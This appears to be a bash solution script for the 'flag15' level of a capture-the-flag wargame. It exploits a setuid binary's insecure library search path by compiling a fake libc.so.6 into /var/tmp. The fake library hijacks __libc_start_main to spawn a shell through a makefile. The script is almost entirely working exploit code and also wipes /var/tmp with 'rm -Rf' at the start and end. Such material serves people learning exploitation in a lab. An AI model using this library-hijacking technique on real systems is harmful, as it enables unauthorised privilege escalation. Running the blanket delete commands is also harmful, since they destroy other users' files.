#!/bin/bash
##
#
##

# clean up the area
rm -Rf /var/tmp/*

# get the first location viewed by dlopen()
# open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
LIBCLOC=$(strace ~flag15/flag15 2>&1 >/dev/null | grep "^open.*ENOENT" | head -n 1)

# parse what we have been given to acquire the libary name
IFS="\""       # set delimiter to "
set ${LIBCLOC} # split
unset IFS      # set delimiter to default

# we want the library name
# /var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6
LIBC=${2}

# create the directory (if it doesn't yet exist)
mkdir -p `dirname ${LIBC}`
cd `dirname ${LIBC}` # move there to continue

# create a build location
mkdir -p lib && cd lib

C="#include <unistd.h>

/* the heart of libc (no attributes used) */
int __libc_start_main(int __attribute__((unused)) (*main)(int, char**, char**), int __attribute__((unused)) argc, char __attribute__((unused)) **argv, void __attribute__((unused)) (*init)(void), void __attribute__((unused)) (*fini)(void), void __attribute__((unused)) (*rtld_fini)(void), void __attribute__((unused)) (*stack_end)) {
  char *env[] = { /* set the PATH up for the 'make' call */
    \"PATH=/bin:/usr/bin:/usr/lib/gcc/i686-linux-gnu/4.6.1\"
  };

  /* call make to generate our shell */
  execle(\"/usr/bin/make\", \"make\", \"-f\", \"/tmp/makefile\", (char*) 0, env);
  return 0;
}
"

echo "${C}" > libc.c # source code
echo -e "GLIBC_2.0 {\n};" > versions.ldscript

# compile the shared library to replace libc for ~flag15/flag15
gcc -shared -Wl,--version-script,versions.ldscript,-Bstatic -static-libgcc libc.c -o libc.so -pedantic -Wall -Wextra
# symbolically link to the correct location
ln -s `pwd`/libc.so ../libc.so.6

# call the application
# which creates the shell in /tmp
~flag15/flag15

# clean up the area
rm -Rf /var/tmp/*
